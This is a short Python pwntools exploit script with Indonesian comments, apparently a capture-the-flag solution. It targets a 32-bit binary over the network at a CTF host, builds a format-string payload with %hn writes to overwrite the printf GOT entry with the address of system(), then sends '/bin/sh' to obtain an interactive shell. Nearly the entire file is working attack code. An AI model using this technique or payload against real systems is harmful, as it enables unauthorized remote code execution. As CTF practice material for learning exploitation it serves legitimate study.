from pwn import *

# === 1. KONFIGURASI TARGET ===
# Hapus '#' pada salah satu baris di bawah ini sesuai kebutuhan
# io = process('./vuln')              # Mode: LOCAL
io = remote('target-ctf.id', 1234)    # Mode: REMOTE (NC)

# Set arsitektur (i386 untuk 32-bit sesuai gambar lu)
context.arch = 'i386'

# === 2. DATA DARI ANALISIS (image_eb9c81.png & ebaf05.png) ===
got_printf = 0x0804a010  # Alamat GOT[printf] yang mau ditimpa
system_addr = 0xb7e52070 # Alamat system() dari libc
fmt_offset = 4           # Offset 'buf' di stack (dari eksperimen AAAA)

# Pecah alamat system menjadi dua bagian (2 byte masing-masing)
# 0xb7e52070 -> low: 0x2070 (8304), high: 0xb7e5 (47077)
low = system_addr & 0xffff
high = (system_addr >> 16) & 0xffff

# === 3. STRUKTUR PAYLOAD (image_ebaf05.png) ===
# Kita pakai %hn untuk nulis 2 byte sekaligus

# Taruh alamat target di awal payload (8 byte header)
addr_low = p32(got_printf)
addr_high = p32(got_printf + 2)

# Hitung padding untuk menulis nilai 'low'
# Kurangi 8 karena sudah ada 8 byte dari alamat di awal
fmt_low = low - 8
# Hitung padding untuk 'high' (high - low)
fmt_high = high - low

payload = addr_low + addr_high
payload += f"%{fmt_low}c%4$hn".encode() # Tulis ke parameter ke-4
payload += f"%{fmt_high}c%5$hn".encode() # Tulis ke parameter ke-5

# === 4. EKSEKUSI ===

# Kirim payload pertama untuk overwrite GOT[printf] -> system()
io.sendline(payload)

# Karena printf sekarang adalah system, kirim "/bin/sh" sebagai input selanjutnya
# Program akan mengeksekusi: system("/bin/sh")
io.sendline(b'/bin/sh')

# Masuk ke mode interaktif untuk kontrol shell
io.interactive()